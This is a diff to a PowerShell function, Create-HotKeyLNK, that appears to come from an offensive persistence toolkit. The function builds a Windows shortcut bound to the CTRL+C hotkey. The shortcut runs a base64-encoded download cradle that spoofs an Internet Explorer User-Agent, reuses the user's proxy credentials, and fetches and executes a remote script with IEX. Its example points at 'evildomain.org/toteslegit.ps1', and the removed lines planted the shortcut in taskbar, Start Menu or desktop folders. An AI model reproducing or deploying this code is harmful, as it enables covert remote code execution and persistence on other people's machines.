@@ -10,11 +10,7 @@ function Create-HotKeyLNK {
 
     .PARAMETER Name
 
-        The name of the .LNK file to create.
-
-    .PARAMETER PersistencePath
-
-        The path to drop the new LNK file. TaskBar,ImplicitAppShortcuts,Start Menu, or Desktop. Defaults to TaskBar.  
+        The name of the .LNK file to create. 
 
     .PARAMETER EXEPath
 
@@ -30,11 +26,11 @@ function Create-HotKeyLNK {
     
     .PARAMETER PayloadURI
 
-   
+        http://mydomain.com/payload.svg
+
    .EXAMPLE
 
-        Create-HotKeyLNK -Name Google -PersistencePath ImplicitAppShortcuts -HotKey "CTRL+C" -PayloadURI "http://evildomain.org/toteslegit.ps1"
-
+        Create-HotKeyLNK -Name Google -EXEPath "C:\\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -HotKey "CTRL+C" -PayloadURI "http://evildomain.org/toteslegit.ps1"
         
     
 #>
@@ -43,11 +39,7 @@ function Create-HotKeyLNK {
 
     [Parameter(Mandatory=$True)]
         [String]
-        $LNKName,
-
-        [Parameter(Mandatory=$True)]
-        [String]
-        $PersistencePath = "TaskBar",
+        $LNKName = "IE.lnk",
 
         [Parameter()]
         [String]
@@ -60,23 +52,11 @@ function Create-HotKeyLNK {
         [String]
         $HotKey = "CTRL+C",
 
-        [Parameter(Mandatory=$True)]
+        [Parameter(Mandatory=$False)]
         [String]
         $PayloadURI
 
     )
-
-     
-    $LNKName = "C:\Users\rvrsh3ll\Desktop\" + $LNKName + ".lnk"
-    if ($PersistencePath -eq 'TaskBar') {
-        $PersistencePath = "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
-    } elseif ($PersistencePath -eq 'ImplicitAppShortcuts'){
-        $PersistencePath = "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\ImplicitAppShortcuts"
-    } elseif ($PersistencePath -eq 'Start Menu') {
-        $PersistencePath = "$env:APPDATA\Microsoft\Windows\Start Menu"
-    } elseif ($PersistencePath -eq 'Desktop') {
-        $PersistencePath = "$env:userprofile\Desktop"
-    }
 
     $payload = "`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('$PayloadURI'))"
     $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
